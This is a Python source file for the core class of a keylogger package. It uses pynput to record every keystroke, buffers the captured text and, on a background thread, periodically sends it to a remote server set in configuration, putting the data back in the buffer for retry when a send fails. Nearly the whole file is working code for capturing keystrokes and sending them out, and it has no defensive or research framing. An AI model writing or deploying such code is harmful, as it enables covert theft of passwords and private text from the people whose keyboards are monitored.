"""
Core keylogger module.
Main keylogger class with all improvements.
"""

import signal
import threading
import logging
from typing import Optional

from pynput import keyboard

from .config import KeyloggerConfig
from .buffer import KeyBuffer
from .client import KeyloggerClient
from .logger import KeyloggerLogger


class Keylogger:
    """Main keylogger class with all improvements."""

    # Special key mappings - built dynamically to handle version differences
    SPECIAL_KEYS = {}

    # Initialize special keys dynamically
    _key_mappings = [
        ("enter", "\n"),
        ("tab", "\t"),
        ("space", " "),
        ("shift", ""),
        ("shift_r", ""),
        ("ctrl_l", ""),
        ("ctrl_r", ""),
        ("alt_l", ""),
        ("alt_r", ""),
        ("cmd", ""),
        ("cmd_r", ""),
        ("esc", "[ESC]"),
        ("backspace", "[BACKSPACE]"),
        ("delete", "[DEL]"),
        ("up", "[UP]"),
        ("down", "[DOWN]"),
        ("left", "[LEFT]"),
        ("right", "[RIGHT]"),
        ("home", "[HOME]"),
        ("end", "[END]"),
        ("page_up", "[PGUP]"),
        ("page_down", "[PGDN]"),
        ("insert", "[INS]"),
        ("caps_lock", "[CAPS]"),
        ("num_lock", "[NUM]"),
        ("scroll_lock", "[SCRL]"),
        ("print_screen", "[PRTSC]"),
        ("pause", "[PAUSE]"),
        ("menu", "[MENU]"),
    ]

    for key_name, mapped_value in _key_mappings:
        key_attr = getattr(keyboard.Key, key_name, None)
        if key_attr is not None:
            SPECIAL_KEYS[key_attr] = mapped_value

    # Function keys
    for i in range(1, 13):
        key_attr = getattr(keyboard.Key, f"f{i}", None)
        if key_attr is not None:
            SPECIAL_KEYS[key_attr] = f"[F{i}]"

    def __init__(self, config: KeyloggerConfig) -> None:
        self.config = config
        self.logger = KeyloggerLogger(config).get_logger()
        self.buffer = KeyBuffer(config.rate_limit_per_interval)
        self.client = KeyloggerClient(config, self.logger)
        self.running = False
        self._sender_thread: Optional[threading.Thread] = None
        self._listener: Optional[keyboard.Listener] = None
        self._shutdown_event = threading.Event()

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum: int, frame: Optional[object]) -> None:
        """Handle shutdown signals gracefully."""
        self.logger.info(f"Received signal {signum}, shutting down...")
        self.stop()

    def _on_press(self, key: keyboard.Key) -> Optional[bool]:
        """Handle key press events."""
        try:
            if key == keyboard.Key.esc:
                self.logger.info("ESC pressed, stopping keylogger")
                self.stop()
                return False

            # Handle special keys
            if key in self.SPECIAL_KEYS:
                mapped = self.SPECIAL_KEYS[key]
                if mapped:
                    self.buffer.add(mapped)
                return None

            # Handle backspace specially
            if key == keyboard.Key.backspace:
                current = self.buffer.get_and_clear()
                if current:
                    self.buffer.add(current[:-1])
                return None

            # Handle regular characters
            try:
                char = key.char
                if char is not None:
                    # Sanitize control characters except newline/tab
                    if ord(char) < 32 and char not in ("\n", "\t", "\r"):
                        char = f"[CTRL:{ord(char)}]"
                    self.buffer.add(char)
            except AttributeError:
                # Key without char attribute
                key_str = str(key).strip("'")
                if key_str:
                    self.buffer.add(f"[{key_str.upper()}]")

        except Exception as e:
            self.logger.error(f"Error processing key: {e}")

        return None

    def _sender_loop(self) -> None:
        """Background thread to periodically send buffered data."""
        self.logger.info(f"Sender thread started (interval: {self.config.interval}s)")

        while not self._shutdown_event.is_set():
            # Wait for interval or shutdown
            if self._shutdown_event.wait(timeout=self.config.interval):
                break

            if not self.running:
                break

            # Get and send buffered data
            data = self.buffer.get_and_clear()
            if data:
                self.logger.debug(f"Sending {len(data)} characters")
                success = self.client.send(data)
                if not success:
                    self.logger.warning("Failed to send data, will retry next interval")
                    # Put data back in buffer for retry
                    self.buffer.add(data)

        self.logger.info("Sender thread stopped")

    def start(self) -> None:
        """Start the keylogger."""
        if self.running:
            self.logger.warning("Keylogger already running")
            return

        self.logger.info("Starting keylogger...")
        self.logger.info(f"Server: {self.config.base_url}")
        self.logger.info(f"Interval: {self.config.interval}s")
        self.logger.info(f"TLS: {'Enabled' if self.config.use_tls else 'Disabled'}")
        self.logger.info("Press ESC to stop")

        self.running = True
        self._shutdown_event.clear()

        # Start sender thread
        self._sender_thread = threading.Thread(target=self._sender_loop, daemon=True)
        self._sender_thread.start()

        # Start keyboard listener
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()

        try:
            self._listener.join()
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt received")
        finally:
            self.stop()

    def stop(self) -> None:
        """Stop the keylogger gracefully."""
        if not self.running:
            return

        self.logger.info("Stopping keylogger...")
        self.running = False
        self._shutdown_event.set()

        # Send any remaining data
        data = self.buffer.get_and_clear()
        if data:
            self.logger.info(f"Sending final {len(data)} characters")
            self.client.send(data)

        # Stop listener
        if self._listener:
            self._listener.stop()

        # Wait for sender thread
        if self._sender_thread and self._sender_thread.is_alive():
            self._sender_thread.join(timeout=5)

        # Close client
        self.client.close()

        self.logger.info("Keylogger stopped")


def main() -> None:
    """Main entry point."""
    import sys

    try:
        from .config import load_config_from_env

        config = load_config_from_env()
    except ValueError as e:
        print(f"Configuration error: {e}", file=sys.stderr)
        sys.exit(1)

    keylogger = Keylogger(config)
    keylogger.start()


if __name__ == "__main__":
    main()